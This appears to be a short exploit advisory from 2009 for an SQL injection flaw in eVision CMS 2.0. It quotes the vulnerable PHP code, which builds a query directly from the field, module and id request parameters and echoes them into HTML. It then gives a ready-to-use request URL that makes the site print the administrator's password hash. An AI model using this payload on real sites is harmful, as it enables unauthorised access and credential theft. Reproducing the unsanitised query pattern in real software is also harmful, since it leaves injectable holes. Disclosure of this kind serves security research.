<html><head><title>eVision CMS <= 2.0 (field) SQL Injection Vulnerability</title></head><pre>--+++============================================================+++--
--+++====== eVision CMS &lt;= 2.0 SQL Injection Vulnerability ======+++--
--+++============================================================+++--

[+] Author  : darkjoker
[+] Site    : http://darkjoker.net23.net
[+] Download: http://kent.dl.sourceforge.net/sourceforge/e-vision/eVision-2.0.tar.gz

[+] Vulnerable code:

    67  $sql = &quot;SELECT `&quot;.$_GET['field'].&quot;` FROM &quot;.$_GET['module'].&quot; WHERE `id&quot;.$_GET['module'].&quot;`='&quot;.$_GET['id'].&quot;'&quot;;
    68  $result = mysql_query($sql);
    69  $row = mysql_fetch_array($result);
    70
    71  if ( isset($_GET['div']) ) { $div = 'class=&quot;'.$_GET['div'].'&quot;'; }
    72  else { $div = ''; }
    73  if ( isset($_GET['font']) ) { $font = 'class=&quot;'.$_GET['font'].'&quot;'; }
    74  else { $font = ''; }
    75
    76  echo '
    77  &lt;html '.$div.'&gt;
    78  &lt;head&gt;
    79          &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset='.$charset.'&quot;&gt;
    80          &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; href=&quot;'.$path.'style.php?template='.$template.'&amp;module='.$_GET['module'].'&quot;&gt;
    81  &lt;/head&gt;
    82  &lt;body marginwidth=&quot;0&quot; marginheight=&quot;0&quot; topmargin=&quot;0&quot; leftmargin=&quot;0&quot; '.$font.'&gt;'.set_text($row[$_GET['field']]).'&lt;/body&gt;
    83  &lt;/html&gt;
    84  ';


[+] It prints admin's password (hashed):

[+] /iframe.php?field=pass&amp;module=users&amp;id=1

# milw0rm.com [2009-01-30]</pre></html>